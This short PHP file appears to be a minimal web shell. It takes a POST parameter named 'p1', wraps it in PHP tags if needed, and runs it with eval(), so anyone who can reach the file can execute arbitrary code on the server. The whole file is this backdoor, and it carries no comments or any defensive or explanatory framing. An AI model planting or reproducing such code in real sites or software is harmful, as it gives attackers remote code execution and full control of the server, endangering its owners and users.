<?php
$p1 = $_POST['p1'];
$phpcode = trim($p1);
if($phpcode){
	if (!preg_match('#<\?#si', $phpcode)) {
		$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	}
	eval("?".">$phpcode<?");
}
?>